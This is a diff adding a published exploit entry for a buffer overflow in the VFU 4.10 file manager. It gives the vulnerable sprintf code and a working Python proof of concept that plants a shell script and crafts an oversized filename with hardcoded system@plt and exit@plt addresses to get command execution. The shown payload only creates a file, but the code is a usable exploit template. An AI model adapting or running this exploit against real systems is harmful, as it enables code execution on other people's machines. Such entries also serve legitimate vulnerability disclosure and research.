@@ -1,0 +1,48 @@
+# Exploit Title: VFU Move Entry Buffer Overflow
+# Date: 2015-02-25
+# Exploit Author: Bas van den Berg -- @barrebas
+# Vendor Homepage: http://cade.datamax.bg/
+# Software Link: http://cade.datamax.bg/vfu/#download
+# Version: 4.10-1.1
+# Tested on: GNU/Linux Kali 1.09 32-bit & Crunchbang 11 Waldorf (based on Debian Wheezy), kernel 3.2.0-4
+
+# VFU 4.10 (probably up to 4.14) contains a buffer overflow when a user
+# moves a file entry around with a large filename. To trigger this 
+# vulnerability, extensive user interaction is required.
+# Steps to reproduce the bug: create a file with a large (>115 
+# characters), run VFU and select 'A' and then 'V' to move the large 
+# file entry around. Upon confirming the entry move, VFU crashes due to 
+# a buffer overflow in this function:
+
+'''
+void vfu_file_entry_move()
+{
+  char t[128];
+  sprintf( t, "MOVE/REORDER File entry: %s", files_list[FLI]->name() );
+  say1( t );
+  say2( "Use Up/Down Arrows to reorder, ESC,ENTER when done." );
+'''
+
+# This overflow allows execution of arbitrary commands with the 
+# privilege of the current user. The attached PoC demonstrates this. It 
+# drops two files: the large filename and a shellscript that allows 
+# arbitrary command execution. Usage: $ python vfu-move-entry-poc.py
+
+
+import struct
+import os
+
+def p(x):
+	return struct.pack('<L', x & 0xffffffff)
+
+with open('./vstring.h', 'w') as f:
+	f.write('#!/bin/sh\ntouch pwned')
+	f.close()
+os.chmod('./vstring.h', 0755)
+
+payload = "A"*115
+payload += p(0x8049ca0) # system@plt
+payload += p(0x804a260) # exit@plt
+payload += p(0x8088e44) # -> ./vstring.h
+
+open(payload, 'w').close()
